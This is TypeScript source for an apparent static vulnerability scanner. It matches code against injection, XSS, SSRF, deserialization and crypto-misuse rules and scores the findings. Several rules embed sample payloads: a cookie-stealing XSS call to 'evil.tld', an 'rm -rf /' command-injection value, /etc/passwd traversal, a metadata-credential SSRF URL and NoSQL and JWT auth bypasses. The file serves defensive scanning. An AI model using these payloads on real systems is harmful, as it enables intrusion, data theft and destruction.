// CrackScope attack-simulation engine — Part 3 (taint-tracked heuristics).
// Analyzes user-submitted source files, tracks user-controlled data from
// sources to dangerous sinks (lib/taint), simulates exploitation paths for
// each confirmed weakness, and produces a pentest-style scored report.
// Pure TypeScript so it runs instantly client-side; Part 8 (AI deep
// analysis) will layer on top of this API.
import { computeTaint, isLineTainted } from "./taint";
import { detectSecrets } from "./secrets";
import { auditDependencies } from "./deps";
import { runFuzzing } from "./fuzz";
import { detectAuthAttacks } from "./authattacks";
import { detectCryptoMisuse } from "./cryptomisuse";
import { runInjectionDeepScan, detectEngine } from "./injection";

export type Severity = "critical" | "high" | "medium" | "low" | "info";

export interface ScanInput {
  name: string;
  content: string;
}

export interface Finding {
  ruleId: string;
  title: string;
  severity: Severity;
  category: string;
  owasp: string;
  file: string;
  line: number;
  snippet: string;
  description: string;
  remediation: string;
  payload: string;
}

export interface ScanResult {
  score: number; // 0-100
  grade: "A" | "B" | "C" | "D" | "F";
  filesScanned: number;
  linesScanned: number;
  languages: string[];
  counts: Record<Severity, number>;
  findings: Finding[];
  durationMs: number;
}

export const SEVERITY_WEIGHT: Record<Severity, number> = {
  critical: 20,
  high: 11,
  medium: 5,
  low: 2,
  info: 0.5,
};

interface Rule {
  id: string;
  title: string;
  severity: Severity;
  category: string;
  owasp: string;
  description: string;
  remediation: string;
  payload: string;
  pattern: RegExp;
  maxMatchesPerFile?: number;
  /** Only fire when the matched line carries user-controlled data (taint). */
  taintRequired?: boolean;
  /** Skip lines containing any of these (naive false-positive dampening). */
  safeHints?: string[];
}

const RULES: Rule[] = [
  {
    id: "SQLI-001",
    title: "SQL injection via string-built query",
    severity: "critical",
    category: "Injection",
    owasp: "A03:2021 – Injection",
    description:
      "A SQL statement appears to be assembled by concatenating or interpolating variables directly into the query string. An attacker who controls those variables can break out of the query and read, modify, or destroy arbitrary database contents.",
    remediation:
      "Use parameterized queries / prepared statements for every value that reaches a query. Never build SQL with string concatenation, and validate that numeric inputs are numeric before use.",
    payload: `Input: username = admin'--\nResulting query: SELECT * FROM users WHERE name='admin'--' AND pass='...'\nEffect: password check bypassed; trailing conditions commented out.`,
    pattern: /\b(?:query|execute|exec|raw)\s*\(\s*[`'"][^`'"]*(?:SELECT|INSERT|UPDATE|DELETE|DROP)\b[^`'"]*[`'"]?\s*\+/i,
    maxMatchesPerFile: 5,
    taintRequired: true,
    safeHints: ["?", "prepare", "parameterized"],
  },
  {
    id: "SQLI-002",
    title: "SQL query with interpolated variable (f-string / template)",
    severity: "high",
    category: "Injection",
    owasp: "A03:2021 – Injection",
    description:
      "A SQL statement contains a template placeholder or format interpolation for user-controlled data. Even without concatenation, interpolated values are parsed as SQL syntax before parameter binding can happen.",
    remediation:
      "Pass values as query parameters instead of formatting them into the SQL text (e.g. cursor.execute(sql, (value,)) or an ORM filter expression).",
    payload: `Input: id = 1 OR 1=1\nResulting query: SELECT * FROM items WHERE id = 1 OR 1=1\nEffect: full-table enumeration instead of a single row.`,
    pattern: /\b(?:SELECT|INSERT|UPDATE|DELETE)\b[^;\n]*(?:\$\{|%s|%d|\+ *\w+|\w+ *\+)/,
    maxMatchesPerFile: 5,
    safeHints: ["prepare", "parameterized", "--"],
  },
  {
    id: "XSS-001",
    title: "Unsanitized HTML injection (XSS sink)",
    severity: "high",
    category: "Cross-Site Scripting",
    owasp: "A03:2021 – Injection",
    description:
      "Raw HTML is rendered from a value that may include user input (innerHTML / dangerouslySetInnerHTML / document.write / v-html). Injected script executes in the victim's browser session, enabling cookie theft and request forgery.",
    remediation:
      "Render text content instead of HTML where possible. If HTML is required, sanitize with DOMPurify (or an equivalent allowlist sanitizer) before insertion.",
    payload: `Input: <img src=x onerror="fetch('https://evil.tld?c='+document.cookie)">\nEffect: session cookies exfiltrated to attacker server on page load.`,
    pattern: /\.innerHTML\s*=|dangerouslySetInnerHTML|document\.write\s*\(|v-html/,
    maxMatchesPerFile: 5,
    taintRequired: true,
  },
  {
    id: "XSS-002",
    title: "User input echoed into response without encoding",
    severity: "medium",
    category: "Cross-Site Scripting",
    owasp: "A03:2021 – Injection",
    description:
      "A response or template appears to embed request data (query params, body, form fields) directly into markup. Reflected XSS lets an attacker craft links that run script in other users' browsers.",
    remediation:
      "HTML-encode all reflected values, set a strict Content-Type, and add a strong Content-Security-Policy as a second line of defense.",
    payload: `Link: https://app.tld/search?q=<script>new Image().src='https://evil.tld?'+document.cookie</script>\nEffect: script runs for anyone who clicks the crafted link.`,
    pattern: /res\.(?:send|write)\s*\(\s*(?:req\.(?:query|body|params)|request\.(?:query|json))/,
    maxMatchesPerFile: 5,
  },
  {
    id: "CMD-001",
    title: "OS command injection risk (shell execution with concatenation)",
    severity: "critical",
    category: "Command Injection",
    owasp: "A03:2021 – Injection",
    description:
      "A command is executed through a shell with variables concatenated into the command string. Shell metacharacters in user input let an attacker run arbitrary commands on the host.",
    remediation:
      "Avoid shelling out. If unavoidable, pass arguments as an argv array (execFile / spawn without shell:true) and never interpolate input into the command string.",
    payload: `Input: filename = report.pdf; rm -rf /\nCommand: cat report.pdf; rm -rf /\nEffect: arbitrary command execution on the server.`,
    pattern: /(?:exec|execSync|system|popen|shell_exec|subprocess\.(?:call|run|Popen))\s*\([^)]*(?:\+|`|\$\(|%s|f["'])/,
    maxMatchesPerFile: 5,
    taintRequired: true,
    safeHints: ["execFile", "argv"],
  },
  {
    id: "CMD-002",
    title: "eval() / dynamic code execution",
    severity: "critical",
    category: "Code Injection",
    owasp: "A03:2021 – Injection",
    description:
      "eval()/exec()-style dynamic evaluation turns any attacker-controlled string directly into executable code. It also defeats bundler optimizations and CSP.",
    remediation:
      "Remove eval/exec. Parse structured data with JSON.parse, map strings to functions with a lookup table, or use a sandboxed expression evaluator.",
    payload: `Input: expr = "process.exit(1)" — or worse, remote payloads\nEffect: full JavaScript/Python code execution with the app's privileges.`,
    pattern: /\beval\s*\(|\bexec\s*\(\s*compile|\bnew Function\s*\(/,
    maxMatchesPerFile: 5,
  },
  {
    id: "SEC-001",
    title: "Hardcoded credential / API key",
    severity: "critical",
    category: "Sensitive Data Exposure",
    owasp: "A02:2021 – Cryptographic Failures",
    description:
      "A secret (password, API key, token, or private key material) is embedded in source. Anyone with repository access — or a leaked copy — gains the credential, and rotation history is lost.",
    remediation:
      "Move secrets to environment variables or a secret manager, rotate the exposed credential immediately, and add the file patterns to .gitignore.",
    payload: `Attacker action: grep -rE "api_key|password\\s*=" repo/\nEffect: valid production credential harvested from code history.`,
    pattern: /(?:api[_-]?key|apikey|secret|password|passwd|token|auth[_-]?token)\s*[:=]\s*["'][^"'\s]{8,}["']/i,
    maxMatchesPerFile: 8,
    safeHints: ["process.env", "os.environ", "import.meta.env", "placeholder", "example", "your-", "xxx"],
  },
  // SEC-002 (cloud key patterns) superseded in Part 6 by the dedicated
  // secrets & credentials scanner in lib/secrets.ts (entropy + providers).
  {
    id: "CRYPTO-001",
    title: "Weak hash algorithm (MD5/SHA1) for security purposes",
    severity: "high",
    category: "Cryptographic Failures",
    owasp: "A02:2021 – Cryptographic Failures",
    description:
      "MD5 or SHA-1 is used in a security-relevant context. Both are collision-broken; password or signature use allows forgery and fast offline cracking.",
    remediation:
      "Use SHA-256+ for integrity, and a memory-hard KDF (bcrypt, scrypt, Argon2) for passwords. For plain digests prefer SHA-3/BLAKE2.",
    payload: `Attack: collision or 10^10/s GPU dictionary attack against stored MD5 hashes\nEffect: forged signatures / cracked password dumps.`,
    pattern: /\b(?:md5|sha1)\s*\(|createHash\s*\(\s*["'](?:md5|sha1)["']|hashlib\.(?:md5|sha1)\s*\(/i,
    maxMatchesPerFile: 5,
    safeHints: ["sha256", "sha-256", "sha512"],
  },
  {
    id: "CRYPTO-002",
    title: "Math.random() used for security token",
    severity: "high",
    category: "Cryptographic Failures",
    owasp: "A02:2021 – Cryptographic Failures",
    description:
      "A token, key, or password is generated with Math.random(), which is not cryptographically secure and is predictable across a small search space once outputs are observed.",
    remediation:
      "Use crypto.getRandomValues / crypto.randomBytes / secrets module for any token, session id, key, or nonce.",
    payload: `Attack: observe a few tokens, recover PRNG state, predict future session ids\nEffect: session hijacking of other users.`,
    pattern: /(?:token|secret|password|session|key|nonce|otp|uuid|id)\s*[:=][^;\n]*Math\.random/i,
    maxMatchesPerFile: 5,
  },
  {
    id: "CRYPTO-003",
    title: "Insecure TLS verification disabled",
    severity: "high",
    category: "Cryptographic Failures",
    owasp: "A02:2021 – Cryptographic Failures",
    description:
      "Certificate verification is turned off (verify=False, rejectUnauthorized:false, NODE_TLS_REJECT_UNAUTHORIZED=0). Man-in-the-middle attackers can read and modify all traffic, including credentials.",
    remediation:
      "Remove the flag; install proper CA bundles instead. For self-signed dev servers, pin the specific CA rather than disabling validation.",
    payload: `Attack: ARP-spoof / rogue Wi-Fi AP between client and server\nEffect: all requests (with bearer tokens) intercepted and altered.`,
    pattern: /verify\s*=\s*False|rejectUnauthorized\s*:\s*false|NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*0|InsecureSkipVerify\s*:\s*true/i,
    maxMatchesPerFile: 5,
  },
  {
    id: "AUTH-001",
    title: "JWT configured with 'none' algorithm or weak secret",
    severity: "critical",
    category: "Ident. & Auth Failures",
    owasp: "A07:2021 – Identification and Authentication Failures",
    description:
      "Token verification allows the 'none' algorithm or uses a trivially guessable secret. Attackers can forge tokens claiming any identity or role.",
    remediation:
      "Pin the expected algorithm (e.g. HS256/RS256) at verification, use a long random secret from a secret manager, and validate iss/aud/exp claims.",
    payload: `Crafted token: header {"alg":"none"} + payload {"role":"admin"}\nEffect: forged admin session without knowing any secret.`,
    pattern: /jwt\.(?:verify|decode)\s*\([^)]*(?:algorithms\s*:\s*\[\s*["']none["']|ignoreExpiration\s*:\s*true)|alg\s*[:=]\s*["']none["']/i,
    maxMatchesPerFile: 5,
  },
  {
    id: "AUTH-002",
    title: "Authorization check missing on sensitive route",
    severity: "high",
    category: "Ident. & Auth Failures",
    owasp: "A01:2021 – Broken Access Control",
    description:
      "A data-mutating route resolves records straight from request parameters with no visible ownership or role check — the classic IDOR pattern: change the id, read someone else's data.",
    remediation:
      "Scope every query by the authenticated principal (e.g. where({ id, userId }) ) and enforce role checks in middleware, not just in the UI.",
    payload: `Request: GET /api/invoices/4711 with another tenant's id\nEffect: cross-tenant data read; iterate ids for mass exfiltration.`,
    pattern: /(?:app|router)\.(?:get|post|put|patch|delete)\s*\([^)]*\)\s*,?[^{]*\{[^}]*(?:req\.(?:params|body)\.id|params\.id)\b(?![^}]*userId)(?![^}]*owner)/,
    maxMatchesPerFile: 4,
  },
  {
    id: "PATH-001",
    title: "Path traversal risk in file access",
    severity: "high",
    category: "Path Traversal",
    owasp: "A01:2021 – Broken Access Control",
    description:
      "A filesystem path is built from request data without normalization or containment checks. `../` sequences escape the intended directory to read or write arbitrary files.",
    remediation:
      "Normalize with path.resolve and verify the result stays inside the allowed base directory; reject absolute paths and `..` segments; prefer allowlisted ids mapped to paths.",
    payload: `Input: file = ../../../../etc/passwd  (or ..\\..\\..\\windows\\win.ini)\nEffect: arbitrary file read outside the intended folder.`,
    pattern: /(?:readFile|createReadStream|sendFile|open|unlink|fs\.(?:read|write))\s*\([^)]*(?:\+\s*(?:req|request|params|query)|\.\.\b)/,
    maxMatchesPerFile: 5,
    taintRequired: true,
  },
  {
    id: "NOSQL-001",
    title: "NoSQL operator injection (query object from request)",
    severity: "critical",
    category: "Injection",
    owasp: "A03:2021 – Injection",
    description:
      "A database query is built directly from a request object. Attackers send JSON operators (e.g. {\"$gt\":\"\"}, {\"$ne\":null}, {\"$where\":…}) to alter query logic — the classic NoSQL login bypass and data exfiltration primitive.",
    remediation:
      "Never pass raw request objects into queries. Pick typed fields, validate with a schema (e.g. zod), and strip keys beginning with $ or containing dots before they reach the driver.",
    payload: `Login POST body: {"email":{"$gt":""},"password":{"$gt":""}}\nEffect: query matches the first user regardless of password — authentication bypass.\nVariant: {"$where":"this.role=='admin'"} for blind extraction.`,
    pattern: /\.(?:find|findOne|deleteOne|deleteMany|updateOne|updateMany|aggregate)\s*\(\s*(?:req\.(?:body|query|params)|\{\s*\.\.\.req\.)/,
    maxMatchesPerFile: 5,
    taintRequired: true,
  },
  {
    id: "SSRF-001",
    title: "Server-side request built from user-controlled URL (SSRF)",
    severity: "high",
    category: "SSRF",
    owasp: "A10:2021 – Server-Side Request Forgery",
    description:
      "An outbound HTTP request uses a URL derived from request input. Attackers pivot the server into the internal network: cloud metadata endpoints, admin panels, and internal services.",
    remediation:
      "Allowlist target hosts/schemes, resolve DNS and block private/link-local ranges, disable redirects, and never let raw user input choose the destination.",
    payload: `Input: url = http://169.254.169.254/latest/meta-data/iam/security-credentials/\nEffect: cloud instance role credentials returned to the attacker.`,
    pattern: /(?:fetch|axios(?:\.(?:get|post))?|requests\.get|urllib\.request\.urlopen|http\.Get)\s*\(\s*(?:req\.(?:query|body|params)|request\.(?:query|json)|url\s*\+)/,
    maxMatchesPerFile: 5,
  },
  {
    id: "DESER-001",
    title: "Unsafe deserialization of untrusted data",
    severity: "critical",
    category: "Insecure Deserialization",
    owasp: "A08:2021 – Software and Data Integrity Failures",
    description:
      "Untrusted data is deserialized with a format that can reconstruct arbitrary objects (pickle, yaml.load without Loader, unserialize, eval of JSON). Deserialization gadget chains lead to remote code execution.",
    remediation:
      "Use safe data-only formats: JSON, or yaml.safe_load. Never unpickle/unserialize data that crosses a trust boundary; validate against a schema first.",
    payload: `Payload: crafted pickle/yaml object with __reduce__ / !python/object applying os.system\nEffect: RCE the moment the object is deserialized.`,
    pattern: /pickle\.loads?\s*\(|yaml\.load\s*\((?![^)]*Loader)|\bunserialize\s*\(|nodeSerializable|ObjectInputStream/,
    maxMatchesPerFile: 5,
  },
  {
    id: "CONFIG-001",
    title: "Permissive CORS policy (wildcard origin)",
    severity: "medium",
    category: "Security Misconfiguration",
    owasp: "A05:2021 – Security Misconfiguration",
    description:
      "CORS allows any origin (or reflects it blindly). Any website a victim visits can read authenticated API responses cross-origin.",
    remediation:
      "Echo back only allowlisted origins, and enable credentials only for those specific origins.",
    payload: `Attack page: fetch('https://app.tld/api/me', {credentials:'include'}) from evil.tld\nEffect: victim's private API data read by the attacker's page.`,
    pattern: /Access-Control-Allow-Origin["'\s:]+\*|cors\s*\(\s*\{\s*origin\s*:\s*["']\*["']/,
    maxMatchesPerFile: 4,
  },
  {
    id: "CONFIG-002",
    title: "Debug / development mode exposed in production config",
    severity: "medium",
    category: "Security Misconfiguration",
    owasp: "A05:2021 – Security Misconfiguration",
    description:
      "Debug mode or verbose error output is enabled in what looks like application configuration. Stack traces and interactive consoles leak source code, settings, and sometimes a live debugger.",
    remediation:
      "Gate debug flags on the environment, disable Werkzeug/debug consoles in production, and return generic error pages with details logged server-side only.",
    payload: `Trigger: force an unhandled exception (malformed payload)\nEffect: stack trace reveals file paths, library versions, and config values.`,
    pattern: /DEBUG\s*=\s*True|app\.run\(.*debug\s*=\s*True|debug\s*:\s*true(?![^\n]*(?:NODE_ENV|production))/,
    maxMatchesPerFile: 4,
  },
  {
    id: "REDIR-001",
    title: "Open redirect via unvalidated redirect target",
    severity: "medium",
    category: "Broken Access Control",
    owasp: "A01:2021 – Broken Access Control",
    description:
      "A redirect target is taken from request input without validation. Phishers abuse the trusted domain to bounce victims to malicious sites, and it can amplify OAuth token leaks.",
    remediation:
      "Validate redirect targets against an allowlist of relative paths or trusted hosts; default to a known-safe location when the input fails validation.",
    payload: `Link: https://app.tld/login?next=https://evil-phish.tld/clone\nEffect: victim is redirected to a convincing phishing clone on a trusted referral.`,
    pattern: /(?:redirect|redirectTo|res\.redirect)\s*\(\s*(?:req\.(?:query|body|params)|request\.(?:query|url))/,
    maxMatchesPerFile: 4,
  },
  {
    id: "PROTO-001",
    title: "Deep merge of user input (prototype pollution)",
    severity: "medium",
    category: "Prototype Pollution",
    owasp: "A03:2021 – Injection",
    description:
      "User-controlled objects are merged without filtering __proto__, constructor, or prototype keys. Polluting Object.prototype can flip security-relevant defaults or escalate into RCE in some frameworks.",
    remediation:
      "Block __proto__/constructor/prototype keys in recursive merges, or use structuredClone / Object.create(null) based merging.",
    payload: `JSON body: {"__proto__":{"isAdmin":true}}\nEffect: every new object inherits isAdmin=true; auth checks keyed on defaults fail open.`,
    pattern: /(?:merge|deepMerge|extend|defaultsDeep)\s*\([^)]*(?:req\.body|request\.json|userInput)/,
    maxMatchesPerFile: 4,
  },
];

function extToLanguage(name: string): string {
  const ext = name.split(".").pop()?.toLowerCase() ?? "";
  const map: Record<string, string> = {
    ts: "TypeScript", tsx: "TypeScript", js: "JavaScript", jsx: "JavaScript",
    mjs: "JavaScript", cjs: "JavaScript", py: "Python", rb: "Ruby",
    go: "Go", java: "Java", php: "PHP", cs: "C#", cpp: "C++", c: "C",
    rs: "Rust", sql: "SQL", yml: "YAML", yaml: "YAML", json: "JSON",
    env: "Config", sh: "Shell", html: "HTML", vue: "Vue", svelte: "Svelte",
  };
  return map[ext] ?? "Unknown";
}

function isComment(line: string): boolean {
  const t = line.trim();
  return (
    t.startsWith("//") || t.startsWith("#") || t.startsWith("/*") ||
    t.startsWith("*") || t.startsWith("<!--") || t.startsWith("--")
  );
}

export function scan(inputs: ScanInput[]): ScanResult {
  const started = performance.now();
  const findings: Finding[] = [];
  const languages = new Set<string>();
  let linesScanned = 0;

  // Part 16: detect the database engine once from manifests so engine-aware
  // payloads can be attached to injection findings.
  let engine: string | null = null;
  for (const input of inputs) {
    engine = detectEngine(input);
    if (engine) break;
  }

  for (const input of inputs) {
    const language = extToLanguage(input.name);
    if (language !== "Unknown") languages.add(language);
    const lines = input.content.split("\n");
    linesScanned += lines.length;
    const taint = computeTaint(lines);
    const reportedLines = new Set<number>();

    for (const rule of RULES) {
      let matches = 0;
      const cap = rule.maxMatchesPerFile ?? 5;
      for (let i = 0; i < lines.length && matches < cap; i++) {
        const line = lines[i];
        if (isComment(line)) continue;
        if (rule.safeHints?.some((h) => line.toLowerCase().includes(h.toLowerCase()))) continue;
        const m = rule.pattern.exec(line);
        if (!m) continue;
        if (rule.taintRequired && !isLineTainted(line, taint)) continue;
        matches++;
        reportedLines.add(i + 1);
        findings.push({
          ruleId: rule.id,
          title: rule.title,
          severity: rule.severity,
          category: rule.category,
          owasp: rule.owasp,
          file: input.name,
          line: i + 1,
          snippet: line.trim().slice(0, 220),
          description: rule.description,
          remediation: rule.remediation,
          payload: rule.payload,
        });
      }
    }

    // Part 6: dedicated secrets pass (provider patterns + entropy),
    // skipping lines the rule pass already reported.
    findings.push(...detectSecrets(input, reportedLines));

    // Part 7: dependency & supply-chain audit pass for manifest/lockfiles
    // (package.json, package-lock.json, requirements.txt).
    findings.push(...auditDependencies(input));

    // Part 13: fuzzing pass — mutation strategies over user-controlled flows
    // with crash-pattern heuristics (ReDoS, OOM, parse crashes, OOB).
    findings.push(...runFuzzing(input, reportedLines));

    // Part 14: auth & session attack pass — JWT confusion, session fixation,
    // privilege escalation, brute-force surface (structure rules, no taint).
    findings.push(...detectAuthAttacks(input, reportedLines));

    // Part 15: crypto misuse pass — hardcoded IVs, ECB, nonce reuse, weak
    // keys, unauthenticated encryption, legacy ciphers (structure rules).
    findings.push(...detectCryptoMisuse(input, reportedLines));

    // Part 16: injection deep-scan pass — LDAP, SSTI, ORM raw-query and
    // operator-injection variants, with engine-aware payload selection.
    findings.push(...runInjectionDeepScan(input, reportedLines, engine));
  }

  findings.sort((a, b) => {
    const order: Severity[] = ["critical", "high", "medium", "low", "info"];
    return order.indexOf(a.severity) - order.indexOf(b.severity) || a.file.localeCompare(b.file) || a.line - b.line;
  });

  const counts: Record<Severity, number> = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
  let penalty = 0;
  for (const f of findings) {
    counts[f.severity]++;
    penalty += SEVERITY_WEIGHT[f.severity];
  }

  const score = Math.max(0, Math.min(100, Math.round(100 - penalty)));
  const grade = score >= 90 ? "A" : score >= 75 ? "B" : score >= 60 ? "C" : score >= 40 ? "D" : "F";

  return {
    score,
    grade,
    filesScanned: inputs.length,
    linesScanned,
    languages: [...languages],
    counts,
    findings,
    durationMs: Math.round(performance.now() - started),
  };
}

// Part 5: report building moved to src/lib/report.ts
// (CVSS-style scoring, executive summary, Markdown + print-ready HTML export).
